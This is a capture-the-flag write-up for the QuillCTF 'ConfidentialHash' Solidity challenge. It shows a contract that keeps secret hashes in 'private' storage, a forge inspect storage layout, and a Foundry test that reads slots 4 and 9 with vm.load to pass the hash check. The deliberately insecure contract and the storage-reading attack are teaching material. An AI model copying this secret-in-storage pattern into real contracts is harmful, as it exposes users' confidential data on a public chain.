---
title: QuillCTF-2.ConfidentialHash
date: 2024-01-22 16:59:47
tags:
    - solidity
categories: 
    - QuillCTF
---

```
“Private doesn’t mean confidential”
```

## Objective

- Find the keccak256 hash of aliceHash and bobHash.

## Code

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.7;

contract Confidential {
    string public firstUser = "ALICE";
    uint public alice_age = 24;
		bytes32 private ALICE_PRIVATE_KEY; //Super Secret Key
    bytes32 public ALICE_DATA = "QWxpY2UK";
    bytes32 private aliceHash = hash(ALICE_PRIVATE_KEY, ALICE_DATA);

    string public secondUser = "BOB";
    uint public bob_age = 21;
    bytes32 private BOB_PRIVATE_KEY; // Super Secret Key
    bytes32 public BOB_DATA = "Qm9iCg";
    bytes32 private bobHash = hash(BOB_PRIVATE_KEY, BOB_DATA);
		
		constructor() {}

    function hash(bytes32 key1, bytes32 key2) public pure returns (bytes32) {
        return keccak256(abi.encodePacked(key1, key2));
    }

    function checkthehash(bytes32 _hash) public view returns(bool){
        require (_hash == hash(aliceHash, bobHash));
        return true;
    }
}
```

## Observation

Read the storage

```solidity
string public firstUser = "ALICE"; //0
    uint256 public alice_age = 24; //1
    bytes32 private ALICE_PRIVATE_KEY; //Super Secret Key//2
    bytes32 public ALICE_DATA = "QWxpY2UK"; //3
    bytes32 private aliceHash = hash(ALICE_PRIVATE_KEY, ALICE_DATA); //4

    string public secondUser = "BOB"; //5
    uint256 public bob_age = 21; //6
    bytes32 private BOB_PRIVATE_KEY; // Super Secret Key//7
    bytes32 public BOB_DATA = "Qm9iCg"; //8
    bytes32 private bobHash = hash(BOB_PRIVATE_KEY, BOB_DATA); //9
```

or use forge inspect

```
-> % forge inspect Confidential storage           
{
  "storage": [
    {
      "astId": 45010,
      "contract": "src/2-Hash/Hash.sol:Confidential",
      "label": "firstUser",
      "offset": 0,
      "slot": "0",
      "type": "t_string_storage"
    },
    {
      "astId": 45013,
      "contract": "src/2-Hash/Hash.sol:Confidential",
      "label": "alice_age",
      "offset": 0,
      "slot": "1",
      "type": "t_uint256"
    },
    {
      "astId": 45015,
      "contract": "src/2-Hash/Hash.sol:Confidential",
      "label": "ALICE_PRIVATE_KEY",
      "offset": 0,
      "slot": "2",
      "type": "t_bytes32"
    },
    {
      "astId": 45018,
      "contract": "src/2-Hash/Hash.sol:Confidential",
      "label": "ALICE_DATA",
      "offset": 0,
      "slot": "3",
      "type": "t_bytes32"
    },
    {
      "astId": 45024,
      "contract": "src/2-Hash/Hash.sol:Confidential",
      "label": "aliceHash",
      "offset": 0,
      "slot": "4",
      "type": "t_bytes32"
    },
    {
      "astId": 45027,
      "contract": "src/2-Hash/Hash.sol:Confidential",
      "label": "secondUser",
      "offset": 0,
      "slot": "5",
      "type": "t_string_storage"
    },
    {
      "astId": 45030,
      "contract": "src/2-Hash/Hash.sol:Confidential",
      "label": "bob_age",
      "offset": 0,
      "slot": "6",
      "type": "t_uint256"
    },
    {
      "astId": 45032,
      "contract": "src/2-Hash/Hash.sol:Confidential",
      "label": "BOB_PRIVATE_KEY",
      "offset": 0,
      "slot": "7",
      "type": "t_bytes32"
    },
    {
      "astId": 45035,
      "contract": "src/2-Hash/Hash.sol:Confidential",
      "label": "BOB_DATA",
      "offset": 0,
      "slot": "8",
      "type": "t_bytes32"
    },
    {
      "astId": 45041,
      "contract": "src/2-Hash/Hash.sol:Confidential",
      "label": "bobHash",
      "offset": 0,
      "slot": "9",
      "type": "t_bytes32"
    }
  ],
  "types": {
    "t_bytes32": {
      "encoding": "inplace",
      "label": "bytes32",
      "numberOfBytes": "32"
    },
    "t_string_storage": {
      "encoding": "bytes",
      "label": "string",
      "numberOfBytes": "32"
    },
    "t_uint256": {
      "encoding": "inplace",
      "label": "uint256",
      "numberOfBytes": "32"
    }
  }
}
```

## Attack

- Use load Cheatcode

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/2-Hash/Hash.sol";

contract testCon is Test, Confidential {
    Confidential challenge;

    function setUp() public {
        challenge = new Confidential();
    }

    function testConfidential() public {
        bytes32 aliceHash = vm.load(address(challenge), bytes32(uint256(4)));
        bytes32 bobHash = vm.load(address(challenge), bytes32(uint256(9)));
        bytes32 hash_value = challenge.hash(aliceHash, bobHash);

        bool isOK = challenge.checkthehash(hash_value);
        assert(isOK == true);
    }
}
```